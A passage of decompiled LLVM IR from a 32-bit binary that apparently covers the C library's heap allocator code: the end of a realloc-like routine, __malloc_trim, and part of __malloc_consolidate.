  %v2_80537b0 = add i32 %v0_80537b0, 4
  %v3_80537b0 = add i32 %v2_80537b0, %v1_80537b0
  %v4_80537b0 = inttoptr i32 %v3_80537b0 to i32*
  %v5_80537b0 = load i32, i32* %v4_80537b0, align 4
  %v6_80537b0 = or i32 %v5_80537b0, 1
  store i32 %v6_80537b0, i32* %v4_80537b0, align 4
  %v0_80537b5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80537b5 = add i32 %v0_80537b5, 8
  store i32 %v1_80537b5, i32* %eax.global-to-local, align 4
  store i32 %v1_80537b5, i32* %stack_var_-60, align 4
  %v1_80537b9 = call i32 @free(i32 %v1_80537b5)
  store i32 %v1_80537b9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80537c1

dec_label_pc_80537c1:                             ; preds = %dec_label_pc_805377f, %dec_label_pc_8053791
  %v0_80537c1 = load i32, i32* @edi, align 4
  %v1_80537c1 = add i32 %v0_80537c1, 8
  store i32 %v1_80537c1, i32* @ebx, align 4
  br label %dec_label_pc_805389d

dec_label_pc_80537c9:                             ; preds = %dec_label_pc_8053619
  store i32 %tmp7, i32* %ecx.global-to-local, align 4
  %v0_80537cd = load i32, i32* @global_var_8061b9c.508, align 4
  %v1_80537d2 = add i32 %v0_80537cd, -1
  store i32 %v1_80537d2, i32* %eax.global-to-local, align 4
  %v2_80537d7 = inttoptr i32 %v1_805361d to i32*
  %v3_80537d7 = load i32, i32* %v2_80537d7, align 4
  store i32 %v3_80537d7, i32* @ebp, align 4
  %v1_80537da = or i32 %stack_var_-40.0, 4
  store i32 %v1_80537da, i32* %stack_var_-44, align 4
  %v2_80537e0 = add i32 %v3_80537d7, %v1_80537d2
  store i32 %v2_80537e0, i32* @edx, align 4
  %v1_80537e3 = sub i32 0, %v0_80537cd
  store i32 %v1_80537e3, i32* %eax.global-to-local, align 4
  %v2_80537e5 = add i32 %v2_80537e0, %v1_80537da
  %v2_80537e8 = and i32 %v2_80537e5, %v1_80537e3
  store i32 %v2_80537e8, i32* @esi, align 4
  %v2_80537ec = sub i32 %v2_80537e8, %v3_80537d7
  store i32 %v2_80537ec, i32* @ebx, align 4
  %v15_80537ee = icmp eq i32 %v1_8053625, %v2_80537ec
  br i1 %v15_80537ee, label %dec_label_pc_8053899, label %dec_label_pc_80537f8

dec_label_pc_80537f8:                             ; preds = %dec_label_pc_80537c9
  %v2_80537ff = sub i32 %v1_805361d, %v3_80537d7
  store i32 %v2_80537ff, i32* @edi, align 4
  %v2_8053801 = add i32 %v3_80537d7, %v1_8053625
  store i32 %v2_8053801, i32* %eax.global-to-local, align 4
  store i32 %v2_80537ff, i32* %stack_var_-60, align 4
  %v6_8053805 = call i32 @mremap(i32 %v2_80537ff, i32 %v2_8053801, i32 %v2_80537e8, i32 1, i32 %v1_80537da, i32 %v1_8053625)
  store i32 %v6_8053805, i32* %eax.global-to-local, align 4
  %v10_805380d = icmp eq i32 %v6_8053805, -1
  br i1 %v10_805380d, label %dec_label_pc_8053851, label %dec_label_pc_8053812

dec_label_pc_8053812:                             ; preds = %dec_label_pc_80537f8
  %v1_8053812 = load i32, i32* @ebp, align 4
  %v2_8053812 = add i32 %v1_8053812, %v6_8053805
  store i32 %v2_8053812, i32* @edx, align 4
  %v0_8053815 = load i32, i32* @ebx, align 4
  %v1_8053815 = or i32 %v0_8053815, 2
  store i32 %v1_8053815, i32* %ebx.global-to-local, align 4
  %v0_8053818 = load i32, i32* @esi, align 4
  store i32 %v0_8053818, i32* %eax.global-to-local, align 4
  %v2_805381a = add i32 %v2_8053812, 4
  %v3_805381a = inttoptr i32 %v2_805381a to i32*
  store i32 %v1_8053815, i32* %v3_805381a, align 4
  %v0_805381d = load i32, i32* %eax.global-to-local, align 4
  %v5_805381d = sub i32 %v0_805381d, %v1_8053625
  %v1_8053821 = load i32, i32* @global_var_8061ba4.513, align 4
  %v2_8053821 = add i32 %v1_8053821, %v5_805381d
  store i32 %v2_8053821, i32* %eax.global-to-local, align 4
  store i32 %v2_8053821, i32* @global_var_8061ba4.513, align 4
  %v1_805382c = load i32, i32* @global_var_8061bb0.514, align 16
  %tmp25 = icmp ugt i32 %v2_8053821, %v1_805382c
  br i1 %tmp25, label %dec_label_pc_8053834, label %dec_label_pc_8053839

dec_label_pc_8053834:                             ; preds = %dec_label_pc_8053812
  store i32 %v2_8053821, i32* @global_var_8061bb0.514, align 16
  br label %dec_label_pc_8053839

dec_label_pc_8053839:                             ; preds = %dec_label_pc_8053812, %dec_label_pc_8053834
  %v1_8053839 = load i32, i32* @global_var_8061ba8.515, align 8
  %v2_8053839 = add i32 %v1_8053839, %v2_8053821
  store i32 %v2_8053839, i32* %eax.global-to-local, align 4
  %v1_805383f = load i32, i32* @global_var_8061bb4.516, align 4
  %tmp26 = icmp ugt i32 %v2_8053839, %v1_805383f
  br i1 %tmp26, label %dec_label_pc_8053847, label %dec_label_pc_805384c

dec_label_pc_8053847:                             ; preds = %dec_label_pc_8053839
  store i32 %v2_8053839, i32* @global_var_8061bb4.516, align 4
  br label %dec_label_pc_805384c

dec_label_pc_805384c:                             ; preds = %dec_label_pc_8053839, %dec_label_pc_8053847
  %v0_805384c = load i32, i32* @edx, align 4
  %v1_805384c = add i32 %v0_805384c, 8
  store i32 %v1_805384c, i32* @ebx, align 4
  br label %dec_label_pc_805389d

dec_label_pc_8053851:                             ; preds = %dec_label_pc_80537f8
  %v2_8053851 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8053851, i32* %eax.global-to-local, align 4
  %v10_8053854 = icmp ult i32 %v1_8053625, %v2_8053851
  %v1_8053858 = icmp eq i1 %v10_8053854, false
  br i1 %v1_8053858, label %dec_label_pc_8053899, label %dec_label_pc_805385a

dec_label_pc_805385a:                             ; preds = %dec_label_pc_8053851
  %v1_8053861 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8053861, i32* %eax.global-to-local, align 4
  store i32 %v1_8053861, i32* %stack_var_-60, align 4
  %v1_8053865 = call i32 @malloc(i32 %v1_8053861)
  store i32 %v1_8053865, i32* %eax.global-to-local, align 4
  store i32 %v1_8053865, i32* @ebx, align 4
  %v1_805386f = icmp eq i32 %v1_8053865, 0
  br i1 %v1_805386f, label %dec_label_pc_8053895, label %dec_label_pc_8053873

dec_label_pc_8053873:                             ; preds = %dec_label_pc_805385a
  %v1_8053878 = add i32 %v1_8053625, -8
  store i32 %v1_8053878, i32* %eax.global-to-local, align 4
  store i32 %v1_8053865, i32* %stack_var_-60, align 4
  %v3_8053881 = inttoptr i32 %v1_8053865 to i16*
  %v4_8053881 = call i32 @memcpy(i16* %v3_8053881, i32 %tmp7, i32 %v1_8053878)
  store i32 %v4_8053881, i32* %eax.global-to-local, align 4
  store i32 %v1_8053865, i32* @edx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_805388b = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_8053890

dec_label_pc_8053890:                             ; preds = %dec_label_pc_8053760, %dec_label_pc_8053873
  %storemerge = phi i32 [ %v1_805388b, %dec_label_pc_8053873 ], [ %v1_805376a, %dec_label_pc_8053760 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805389d

dec_label_pc_8053895:                             ; preds = %dec_label_pc_805385a, %dec_label_pc_80536c4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805389d

dec_label_pc_8053899:                             ; preds = %dec_label_pc_8053851, %dec_label_pc_80537c9, %dec_label_pc_8053663
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_805389d

dec_label_pc_805389d:                             ; preds = %dec_label_pc_8053895, %dec_label_pc_8053890, %dec_label_pc_805384c, %dec_label_pc_80537c1, %dec_label_pc_8053899
  store i32 %v2_80535d2, i32* @eax, align 4
  store i32 %v2_80535d2, i32* %stack_var_-60, align 4
  %v2_80538a6 = call i32 @__pthread_return_void(i32 %v2_80535d2, i32 1)
  store i32 %v2_80538a6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80538ab

dec_label_pc_80538ab:                             ; preds = %dec_label_pc_80535b6, %dec_label_pc_80535a2, %dec_label_pc_805389d
  br label %dec_label_pc_80538ae

dec_label_pc_80538ae:                             ; preds = %dec_label_pc_80535f0, %dec_label_pc_80538ab
  %v0_80538b1 = load i32, i32* @ebx, align 4
  store i32 %v0_80538b1, i32* %eax.global-to-local, align 4
  store i32 %v0_8053593, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053592, i32* @esi, align 4
  ret i32 %v0_80538b1

; uselistorder directives
  uselistorder i32 %v1_8053865, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8053839, { 1, 0, 2 }
  uselistorder i32 %v2_8053821, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_80537ff, { 1, 0, 2 }
  uselistorder i32 %v1_80537da, { 1, 0, 2 }
  uselistorder i32 %v3_80537d7, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8053795, { 1, 0 }
  uselistorder i32 %v1_80536fb, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_80536cf, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8053673, { 1, 0, 2 }
  uselistorder i32 %v3_8053686, { 0, 2, 1 }
  uselistorder i32 %v2_8053643, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8053625, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_805361d, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_8053612, { 1, 0 }
  uselistorder i32 %v1_8053602, { 0, 2, 1 }
  uselistorder i32 %v0_80535eb, { 1, 0 }
  uselistorder i32 %v2_80535d2, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80538ae, { 1, 0 }
  uselistorder label %dec_label_pc_80538ab, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805389d, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053890, { 1, 0 }
  uselistorder label %dec_label_pc_805384c, { 1, 0 }
  uselistorder label %dec_label_pc_8053839, { 1, 0 }
  uselistorder label %dec_label_pc_80537c1, { 1, 0 }
  uselistorder label %dec_label_pc_8053774, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053760, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80536b9, { 1, 0 }
  uselistorder label %dec_label_pc_8053619, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_80538bf = load i32, i32* @edx, align 4
  store i32 %v0_80538bf, i32* %ebp.global-to-local, align 4
  %v1_80538c1 = add i32 %v0_80538bf, 860
  %v2_80538c1 = inttoptr i32 %v1_80538c1 to i32*
  %v3_80538c1 = load i32, i32* %v2_80538c1, align 4
  store i32 %v3_80538c1, i32* @ecx, align 4
  %v1_80538c7 = add i32 %v0_80538bf, 44
  %v2_80538c7 = inttoptr i32 %v1_80538c7 to i32*
  %v3_80538c7 = load i32, i32* %v2_80538c7, align 4
  %v1_80538ca = add i32 %v3_80538c7, 4
  %v2_80538ca = inttoptr i32 %v1_80538ca to i32*
  %v3_80538ca = load i32, i32* %v2_80538ca, align 4
  %v1_80538cd = and i32 %v3_80538ca, -4
  store i32 %v1_80538cd, i32* @esi, align 4
  %v1_80538d2 = load i32, i32* @eax, align 4
  %v2_80538d2 = add i32 %v3_80538c1, -17
  %v2_80538d4 = add i32 %v2_80538d2, %v1_80538cd
  %v3_80538d4 = sub i32 %v2_80538d4, %v1_80538d2
  %div = udiv i32 %v3_80538d4, %v3_80538c1
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_80538d4, %v3_80538c1
  store i32 %tmp10, i32* @edx, align 4
  %v1_80538dc = add i32 %div, -1
  %v4_80538df = mul i32 %v1_80538dc, %v3_80538c1
  store i32 %v4_80538df, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_80538df, 1
  br i1 %tmp11, label %dec_label_pc_805393b, label %dec_label_pc_80538e6

dec_label_pc_80538e6:                             ; preds = %entry
  %v1_80538eb = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80538eb, i32* %edi.global-to-local, align 4
  %v0_80538f2 = load i32, i32* @esi, align 4
  store i32 %v0_80538f2, i32* %eax.global-to-local, align 4
  %v1_80538f4 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80538f4 = add i32 %v1_80538f4, 44
  %v3_80538f4 = inttoptr i32 %v2_80538f4 to i32*
  %v4_80538f4 = load i32, i32* %v3_80538f4, align 4
  %v5_80538f4 = add i32 %v4_80538f4, %v0_80538f2
  store i32 %v5_80538f4, i32* %eax.global-to-local, align 4
  %v12_80538fa = icmp eq i32 %v1_80538eb, %v5_80538f4
  %v1_80538fc = icmp eq i1 %v12_80538fa, false
  br i1 %v1_80538fc, label %dec_label_pc_805393b, label %dec_label_pc_80538fe

dec_label_pc_80538fe:                             ; preds = %dec_label_pc_80538e6
  %v1_8053901 = sub i32 0, %v4_80538df
  store i32 %v1_8053901, i32* @ebx, align 4
  %v1_8053904 = call i32 @__GI_sbrk(i32 %v1_8053901)
  store i32 %v1_8053904, i32* %eax.global-to-local, align 4
  %v1_8053910 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053910, i32* %eax.global-to-local, align 4
  %v10_8053918 = icmp eq i32 %v1_8053910, -1
  br i1 %v10_8053918, label %dec_label_pc_805393b, label %dec_label_pc_805391d

dec_label_pc_805391d:                             ; preds = %dec_label_pc_80538fe
  %v0_805391d = load i32, i32* %edi.global-to-local, align 4
  %v2_805391f = sub i32 %v0_805391d, %v1_8053910
  %v12_805391f = icmp eq i32 %v2_805391f, 0
  store i32 %v2_805391f, i32* @ecx, align 4
  br i1 %v12_805391f, label %dec_label_pc_805393b, label %dec_label_pc_8053923

dec_label_pc_8053923:                             ; preds = %dec_label_pc_805391d
  %v0_8053923 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053923 = add i32 %v0_8053923, 44
  %v2_8053923 = inttoptr i32 %v1_8053923 to i32*
  %v3_8053923 = load i32, i32* %v2_8053923, align 4
  store i32 %v3_8053923, i32* %eax.global-to-local, align 4
  %v1_8053926 = add i32 %v0_8053923, 872
  %v2_8053926 = inttoptr i32 %v1_8053926 to i32*
  %v3_8053926 = load i32, i32* %v2_8053926, align 4
  %v5_8053926 = sub i32 %v3_8053926, %v2_805391f
  store i32 %v5_8053926, i32* %v2_8053926, align 4
  %v0_805392c = load i32, i32* @esi, align 4
  %v1_805392c = load i32, i32* @ecx, align 4
  %v2_805392c = sub i32 %v0_805392c, %v1_805392c
  %v1_805392e = or i32 %v2_805392c, 1
  %v1_8053931 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053931 = add i32 %v1_8053931, 4
  %v3_8053931 = inttoptr i32 %v2_8053931 to i32*
  store i32 %v1_805392e, i32* %v3_8053931, align 4
  br label %dec_label_pc_805393d

dec_label_pc_805393b:                             ; preds = %dec_label_pc_805391d, %dec_label_pc_80538fe, %dec_label_pc_80538e6, %entry
  br label %dec_label_pc_805393d

dec_label_pc_805393d:                             ; preds = %dec_label_pc_8053923, %dec_label_pc_805393b
  %storemerge = phi i32 [ 1, %dec_label_pc_8053923 ], [ 0, %dec_label_pc_805393b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8053910, { 1, 0, 2 }
  uselistorder i32 %v4_80538df, { 1, 2, 0 }
  uselistorder i32 %v3_80538c1, { 0, 3, 2, 1, 4 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805393d, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_8053946 = load i32, i32* @edi, align 4
  %v0_8053947 = load i32, i32* @esi, align 4
  %v0_8053948 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8053950 = load i32, i32* %arg1, align 4
  store i32 %v2_8053950, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8053957 = icmp eq i32 %v2_8053950, 0
  br i1 %v1_8053957, label %dec_label_pc_8053a80.preheader, label %dec_label_pc_805395f

dec_label_pc_8053a80.preheader:                   ; preds = %entry
  %v3_8053a75 = add i32 %tmp11, 44
  br label %dec_label_pc_8053a71

dec_label_pc_805395f:                             ; preds = %entry
  %v1_8053963 = and i32 %v2_8053950, -3
  store i32 %v1_8053963, i32* %arg1, align 4
  %v1_8053968 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_8053973 = add i32 %tmp11, 4
  store i32 %v1_8053973, i32* %eax.global-to-local, align 4
  %v2_805397e = load i32, i32* %arg1, align 4
  %v2_8053984 = udiv i32 %v2_805397e, 8
  %v2_8053987 = mul nuw i32 %v2_8053984, 4
  %v3_8053987 = add i32 %tmp11, -4
  %v4_8053987 = add i32 %v3_8053987, %v2_8053987
  store i32 %v4_8053987, i32* %eax.global-to-local, align 4
  %v2_8053a4e = add i32 %tmp11, 44
  %v3_8053a4e = inttoptr i32 %v2_8053a4e to i32*
  %v1_8053a21 = add i32 %tmp11, 60
  %v2_8053a21 = inttoptr i32 %v1_8053a21 to i32*
  br label %dec_label_pc_805398f

dec_label_pc_805398f:                             ; preds = %dec_label_pc_8053a67, %dec_label_pc_805395f
  %v0_805399d = phi i32 [ %v1_8053973, %dec_label_pc_805395f ], [ %v4_8053a67, %dec_label_pc_8053a67 ]
  store i32 %v0_805399d, i32* %eax.global-to-local, align 4
  %v1_8053993 = inttoptr i32 %v0_805399d to i32*
  %v2_8053993 = load i32, i32* %v1_8053993, align 4
  store i32 %v2_8053993, i32* @ecx, align 4
  %v1_8053995 = icmp eq i32 %v2_8053993, 0
  br i1 %v1_8053995, label %dec_label_pc_8053a5d, label %dec_label_pc_805399d

dec_label_pc_805399d:                             ; preds = %dec_label_pc_805398f
  store i32 0, i32* %v1_8053993, align 4
  %v0_80539a3.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80539a3

dec_label_pc_80539a3:                             ; preds = %dec_label_pc_8053a51, %dec_label_pc_805399d
  %v0_80539c0 = phi i32 [ %v3_80539a3, %dec_label_pc_8053a51 ], [ %v0_80539a3.pre, %dec_label_pc_805399d ]
  %v1_80539a3 = add i32 %v0_80539c0, 8
  %v2_80539a3 = inttoptr i32 %v1_80539a3 to i32*
  %v3_80539a3 = load i32, i32* %v2_80539a3, align 4
  store i32 %v3_80539a3, i32* %edx.global-to-local, align 4
  %v1_80539aa = add i32 %v0_80539c0, 4
  %v2_80539aa = inttoptr i32 %v1_80539aa to i32*
  %v3_80539aa = load i32, i32* %v2_80539aa, align 4
  store i32 %v3_80539aa, i32* %eax.global-to-local, align 4
  %v1_80539af = and i32 %v3_80539aa, -2
  store i32 %v1_80539af, i32* @edi, align 4
  %v2_80539b2 = urem i32 %v3_80539aa, 2
  %v3_80539b2 = icmp eq i32 %v2_80539b2, 0
  %v2_80539b4 = add i32 %v1_80539af, %v0_80539c0
  store i32 %v2_80539b4, i32* @ebx, align 4
  %v1_80539b7 = add i32 %v2_80539b4, 4
  %v2_80539b7 = inttoptr i32 %v1_80539b7 to i32*
  %v3_80539b7 = load i32, i32* %v2_80539b7, align 4
  store i32 %v3_80539b7, i32* %edx.global-to-local, align 4
  %v1_80539be = icmp eq i1 %v3_80539b2, false
  br i1 %v1_80539be, label %dec_label_pc_80539e0, label %dec_label_pc_80539c0

dec_label_pc_80539c0:                             ; preds = %dec_label_pc_80539a3
  %v1_80539c0 = inttoptr i32 %v0_80539c0 to i32*
  %v2_80539c0 = load i32, i32* %v1_80539c0, align 4
  store i32 %v2_80539c0, i32* %ebp.global-to-local, align 4
  %v2_80539c4 = sub i32 %v0_80539c0, %v2_80539c0
  store i32 %v2_80539c4, i32* %eax.global-to-local, align 4
  %v1_80539c6 = add i32 %v2_80539c4, 8
  %v2_80539c6 = inttoptr i32 %v1_80539c6 to i32*
  %v3_80539c6 = load i32, i32* %v2_80539c6, align 4
  store i32 %v3_80539c6, i32* @esi, align 4
  %v1_80539c9 = add i32 %v2_80539c4, 12
  %v2_80539c9 = inttoptr i32 %v1_80539c9 to i32*
  %v3_80539c9 = load i32, i32* %v2_80539c9, align 4
  store i32 %v3_80539c9, i32* %edx.global-to-local, align 4
  %v1_80539cc = add i32 %v3_80539c6, 12
  %v2_80539cc = inttoptr i32 %v1_80539cc to i32*
  %v3_80539cc = load i32, i32* %v2_80539cc, align 4
  store i32 %v3_80539cc, i32* @ecx, align 4
  %v12_80539cf = icmp eq i32 %v3_80539cc, %v2_80539c4
  %v1_80539d1 = icmp eq i1 %v12_80539cf, false
  br i1 %v1_80539d1, label %dec_label_pc_8053a10, label %dec_label_pc_80539d3

dec_label_pc_80539d3:                             ; preds = %dec_label_pc_80539c0
  %v1_80539d3 = add i32 %v3_80539c9, 8
  %v2_80539d3 = inttoptr i32 %v1_80539d3 to i32*
  %v3_80539d3 = load i32, i32* %v2_80539d3, align 4
  %v15_80539d3 = icmp eq i32 %v3_80539d3, %v3_80539cc
  %v1_80539d6 = icmp eq i1 %v15_80539d3, false
  br i1 %v1_80539d6, label %dec_label_pc_8053a10, label %dec_label_pc_80539d8

dec_label_pc_80539d8:                             ; preds = %dec_label_pc_80539d3
  %v2_80539d8 = add i32 %v2_80539c0, %v1_80539af
  store i32 %v2_80539d8, i32* @edi, align 4
  store i32 %v3_80539c9, i32* %v2_80539cc, align 4
  %v0_80539dd = load i32, i32* @esi, align 4
  %v1_80539dd = load i32, i32* %edx.global-to-local, align 4
  %v2_80539dd = add i32 %v1_80539dd, 8
  %v3_80539dd = inttoptr i32 %v2_80539dd to i32*
  store i32 %v0_80539dd, i32* %v3_80539dd, align 4
  %v0_80539eb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80539e0

dec_label_pc_80539e0:                             ; preds = %dec_label_pc_80539a3, %dec_label_pc_80539d8
  %v1_80539f4 = phi i32 [ %v2_80539b4, %dec_label_pc_80539a3 ], [ %v0_80539eb.pre, %dec_label_pc_80539d8 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_80539e8 = and i32 %v3_80539b7, -4
  store i32 %v1_80539e8, i32* %ebp.global-to-local, align 4
  %v4_80539eb = load i32, i32* %v3_8053a4e, align 4
  %v15_80539eb = icmp eq i32 %v1_80539f4, %v4_80539eb
  br i1 %v15_80539eb, label %dec_label_pc_8053a41, label %dec_label_pc_80539f0

dec_label_pc_80539f0:                             ; preds = %dec_label_pc_80539e0
  %v2_80539f0 = add i32 %v1_80539f4, 4
  %v3_80539f0 = add i32 %v2_80539f0, %v1_80539e8
  %v4_80539f0 = inttoptr i32 %v3_80539f0 to i32*
  %v5_80539f0 = load i32, i32* %v4_80539f0, align 4
  store i32 %v5_80539f0, i32* %eax.global-to-local, align 4
  %v3_80539f4 = inttoptr i32 %v2_80539f0 to i32*
  store i32 %v1_80539e8, i32* %v3_80539f4, align 4
  %v0_80539f7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80539f7 = urem i32 %v0_80539f7, 2
  %v2_80539f7 = icmp eq i32 %v1_80539f7, 0
  store i32 %v1_80539f7, i32* %eax.global-to-local, align 4
  %v1_80539fc = icmp eq i1 %v2_80539f7, false
  br i1 %v1_80539fc, label %dec_label_pc_8053a1d, label %dec_label_pc_80539fe

dec_label_pc_80539fe:                             ; preds = %dec_label_pc_80539f0
  %v0_80539fe = load i32, i32* @ebx, align 4
  %v1_80539fe = add i32 %v0_80539fe, 8
  %v2_80539fe = inttoptr i32 %v1_80539fe to i32*
  %v3_80539fe = load i32, i32* %v2_80539fe, align 4
  store i32 %v3_80539fe, i32* @edx, align 4
  %v1_8053a01 = add i32 %v0_80539fe, 12
  %v2_8053a01 = inttoptr i32 %v1_8053a01 to i32*
  %v3_8053a01 = load i32, i32* %v2_8053a01, align 4
  store i32 %v3_8053a01, i32* %eax.global-to-local, align 4
  %v1_8053a04 = add i32 %v3_80539fe, 12
  %v2_8053a04 = inttoptr i32 %v1_8053a04 to i32*
  %v3_8053a04 = load i32, i32* %v2_8053a04, align 4
  store i32 %v3_8053a04, i32* @esi, align 4
  %v12_8053a07 = icmp eq i32 %v3_8053a04, %v0_80539fe
  %v1_8053a09 = icmp eq i1 %v12_8053a07, false
  br i1 %v1_8053a09, label %dec_label_pc_8053a10, label %dec_label_pc_8053a0b

dec_label_pc_8053a0b:                             ; preds = %dec_label_pc_80539fe
  %v1_8053a0b = add i32 %v3_8053a01, 8
  %v2_8053a0b = inttoptr i32 %v1_8053a0b to i32*
  %v3_8053a0b = load i32, i32* %v2_8053a0b, align 4
  %v15_8053a0b = icmp eq i32 %v3_8053a0b, %v3_8053a04
  br i1 %v15_8053a0b, label %dec_label_pc_8053a15, label %dec_label_pc_8053a10

dec_label_pc_8053a10:                             ; preds = %dec_label_pc_8053a0b, %dec_label_pc_80539fe, %dec_label_pc_80539d3, %dec_label_pc_80539c0
  %v0_8053a10 = call i32 @abort()
  store i32 %v0_8053a10, i32* %eax.global-to-local, align 4
  %v1_8053a17.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053a15

dec_label_pc_8053a15:                             ; preds = %dec_label_pc_8053a0b, %dec_label_pc_8053a10
  %v1_8053a17 = phi i32 [ %v3_80539fe, %dec_label_pc_8053a0b ], [ %v1_8053a17.pre, %dec_label_pc_8053a10 ]
  %v0_8053a17 = phi i32 [ %v3_8053a01, %dec_label_pc_8053a0b ], [ %v0_8053a10, %dec_label_pc_8053a10 ]
  %v0_8053a15 = load i32, i32* @edi, align 4
  %v1_8053a15 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053a15 = add i32 %v1_8053a15, %v0_8053a15
  store i32 %v2_8053a15, i32* @edi, align 4
  %v2_8053a17 = add i32 %v1_8053a17, 12
  %v3_8053a17 = inttoptr i32 %v2_8053a17 to i32*
  store i32 %v0_8053a17, i32* %v3_8053a17, align 4
  %v0_8053a1a = load i32, i32* @edx, align 4
  %v1_8053a1a = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a1a = add i32 %v1_8053a1a, 8
  %v3_8053a1a = inttoptr i32 %v2_8053a1a to i32*
  store i32 %v0_8053a1a, i32* %v3_8053a1a, align 4
  br label %dec_label_pc_8053a1d

dec_label_pc_8053a1d:                             ; preds = %dec_label_pc_80539f0, %dec_label_pc_8053a15
  store i32 %v1_8053968, i32* %eax.global-to-local, align 4
  %v3_8053a21 = load i32, i32* %v2_8053a21, align 4
  store i32 %v3_8053a21, i32* @edx, align 4
  %v0_8053a24 = load i32, i32* @ecx, align 4
  store i32 %v0_8053a24, i32* %v2_8053a21, align 4
  %v0_8053a27 = load i32, i32* @edi, align 4
  %v1_8053a29 = or i32 %v0_8053a27, 1
  store i32 %v1_8053a29, i32* %eax.global-to-local, align 4
  %v0_8053a2c = load i32, i32* @ecx, align 4
  %v1_8053a2c = load i32, i32* @edx, align 4
  %v2_8053a2c = add i32 %v1_8053a2c, 12
  %v3_8053a2c = inttoptr i32 %v2_8053a2c to i32*
  store i32 %v0_8053a2c, i32* %v3_8053a2c, align 4
  %v0_8053a2f = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a2f = load i32, i32* @ecx, align 4
  %v2_8053a2f = add i32 %v1_8053a2f, 4
  %v3_8053a2f = inttoptr i32 %v2_8053a2f to i32*
  store i32 %v0_8053a2f, i32* %v3_8053a2f, align 4
  store i32 %v1_8053968, i32* %eax.global-to-local, align 4
  %v0_8053a36 = load i32, i32* @edx, align 4
  %v1_8053a36 = load i32, i32* @ecx, align 4
  %v2_8053a36 = add i32 %v1_8053a36, 8
  %v3_8053a36 = inttoptr i32 %v2_8053a36 to i32*
  store i32 %v0_8053a36, i32* %v3_8053a36, align 4
  %v0_8053a39 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a39 = load i32, i32* @ecx, align 4
  %v2_8053a39 = add i32 %v1_8053a39, 12
  %v3_8053a39 = inttoptr i32 %v2_8053a39 to i32*
  store i32 %v0_8053a39, i32* %v3_8053a39, align 4
  %v0_8053a3c = load i32, i32* @edi, align 4
  %v1_8053a3c = load i32, i32* @ecx, align 4
  %v3_8053a3c = add i32 %v1_8053a3c, %v0_8053a3c
  %v4_8053a3c = inttoptr i32 %v3_8053a3c to i32*
  store i32 %v0_8053a3c, i32* %v4_8053a3c, align 4
  br label %dec_label_pc_8053a51

dec_label_pc_8053a41:                             ; preds = %dec_label_pc_80539e0
